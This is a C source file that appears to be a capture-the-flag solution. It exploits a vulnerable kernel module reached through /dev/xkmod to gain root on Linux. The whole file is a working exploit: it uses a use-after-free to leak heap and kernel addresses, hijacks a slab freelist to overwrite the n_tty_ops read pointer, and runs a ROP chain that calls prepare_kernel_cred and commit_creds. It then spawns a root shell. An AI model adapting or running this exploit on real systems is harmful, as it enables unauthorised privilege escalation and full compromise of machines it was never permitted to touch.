#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/prctl.h>
#include <sys/socket.h>
#include <unistd.h>
#include <sys/ioctl.h>

#define MODPROBE_PATH 0xffffffff82444700
#define N_TTY_OPEN 0xffffffff81466710
#define N_TTY_CLOSE 0xffffffff81464dc0
#define N_TTY_FLUSH_BUFFER 0xffffffff814654b0
#define N_TTY_READ 0xffffffff81465a10
#define N_TTY_READ_ADDR 0xffffffff824b1190
#define PREPARE_KERNEL_CRED 0xffffffff8108a9a0
#define POP_RDI_RET 0xffffffff81001518
#define COMMIT_CREDS 0xffffffff8108a660
#define SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81c00a2f
#define XCHG_RAX_RDI_RET 0xffffffff8148c492
#define ADD_RSP_0XC8_RET 0xffffffff811454aa

size_t prepare_kernel_cred, commit_creds;
size_t swapgs_restore_regs_and_return_to_usermode;
size_t pop_rdi_ret, xchg_rax_rdi_ret;
size_t add_rsp_0xc8_ret;

int dev_fd[5];
size_t buf[0x100];
size_t kernel_heap_leak, kernel_heap_search, kernel_text_leak, kernel_cred_leak;
size_t page_offset_base, kernel_base, kernel_offset;

struct Data {
    size_t *ptr;
    unsigned int offset;
    unsigned int length;
} data;

void func_alloc(int dev_fd, struct Data *data)
{
    ioctl(dev_fd, 0x1111111, data);
}

void func_edit(int dev_fd, struct Data *data)
{
    ioctl(dev_fd, 0x6666666, data);
}

void func_get(int dev_fd, struct Data *data)
{
    ioctl(dev_fd, 0x7777777, data);
}

int main(int argc, char **argv, char *envp)
{
    for (int i = 0; i < 5; i++) {
        dev_fd[i] = open("/dev/xkmod", O_RDONLY);
    }

    puts("[*] Start exploiting...");

    data.ptr = malloc(0x1000);
    data.offset = 0;
    data.length = 0x50;
    memset(data.ptr, 0, 0x1000);

    func_alloc(dev_fd[0], &data);
    func_edit(dev_fd[0], &data);
    close(dev_fd[0]);

    func_get(dev_fd[1], &data);
    kernel_heap_leak = data.ptr[0];
    page_offset_base = kernel_heap_leak & 0xfffffffff0000000;
    printf("[+] kernel heap leak: %lx\n", kernel_heap_leak);
    printf("[!] GUESSING page_offset_base: %lx\n", page_offset_base);

    puts("[*] leaking kernel base...");
    // set next->next to be NULL to avoid the crash in allocating
    data.ptr[0] = page_offset_base + 0x9d000 - 0x10;
    data.offset = 0;
    data.length = 8;
    func_edit(dev_fd[1], &data);
    func_alloc(dev_fd[1], &data);
    func_alloc(dev_fd[1], &data);
    data.length = 0x50;
    func_get(dev_fd[1], &data);
    for (int i = 0; i < (0x50 / 8); i++) {
        printf("[-----data dump-----][%d] %lx\n", i, data.ptr[i]);
    }
    if (data.ptr[0] != 0) {
        puts("\033[31m\033[1m[x] FAILED TO HIT page_offset_base! TRY AGAIN!");
        system("/exp");
    }

    kernel_base = data.ptr[2] - 0x30;
    kernel_offset = kernel_base - 0xffffffff81000000;
    printf("\033[32m\033[1m"
           "[+] We got kernel base! It\'s at:\033[0m %lx\n", kernel_base);
    printf("\033[32m\033[1m[+] kernel offset:\033[0m %lx\n", kernel_offset);

    add_rsp_0xc8_ret = ADD_RSP_0XC8_RET + kernel_offset;

    puts("\033[34m\033[1m[*] Start attacking n_tty_ops...\033[0m");
    func_alloc(dev_fd[1], &data); // get a new page for slub
    close(dev_fd[1]);
    data.ptr[0] = kernel_offset + N_TTY_READ_ADDR - 0x20;
    data.offset = 0;
    data.length = 0x8;
    func_edit(dev_fd[2], &data);
    func_alloc(dev_fd[2], &data);
    func_alloc(dev_fd[2], &data);
    data.ptr[0] = (size_t) NULL;
    data.ptr[1] = kernel_offset + N_TTY_OPEN;
    data.ptr[2] = kernel_offset + N_TTY_CLOSE;
    data.ptr[3] = kernel_offset + N_TTY_FLUSH_BUFFER;
    data.ptr[4] = add_rsp_0xc8_ret;
    data.length = 0x28;
    func_edit(dev_fd[2], &data);

    puts("\033[34m\033[1m[*] Start hijacking RIP...\033[0m");
    pop_rdi_ret = POP_RDI_RET + kernel_offset;
    prepare_kernel_cred = PREPARE_KERNEL_CRED + kernel_offset;
    xchg_rax_rdi_ret = XCHG_RAX_RDI_RET + kernel_offset;
    commit_creds = COMMIT_CREDS + kernel_offset;
    swapgs_restore_regs_and_return_to_usermode = \
           SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + kernel_offset + 0xc - 2;
    __asm__ volatile (
        "mov r15,   pop_rdi_ret;"
        "xor r14,   r14;"
        "mov r13,   prepare_kernel_cred;"
        "mov r12,   xchg_rax_rdi_ret;"
        "mov rbp,   commit_creds;"
        "mov rbx,   swapgs_restore_regs_and_return_to_usermode;"
        "mov r11,   0x66666666;"
        "mov r10,   0x77777777;"
        "mov r9,    0x88888888;"
        "mov r8,    0x99999999;"
        "xor rax,   rax;"
        "mov rcx,   0xaaaaaaaa;"
        "mov rdx,   0x8;"
        "mov rsi,   rsp;"
        "xor rdi,   rdi;"
        "syscall"
    );

    if (!getuid()) {
        puts("\033[32m\033[1m[+] Successfully get the ROOT!\033[0m");
    }
    else {
        puts("\033[31m\033[1m[x]"
             "WE FAILED TO GET ROOT BUT WE SUCCESSFULLY LANDED BACK???\n"
             "REDICULOUS!\033[0m");
        exit(EXIT_FAILURE);
    }

    // now we need to repair the n_tty_read
    puts("[*] Now repairing n_tty_ops...");
    data.ptr[4] = N_TTY_READ + kernel_offset;
    func_edit(dev_fd[2], &data);
    puts("[+] Done.");
    puts("\033[34m\033[1m[*]Execve root shell now...\033[0m");
    system("/bin/sh");
}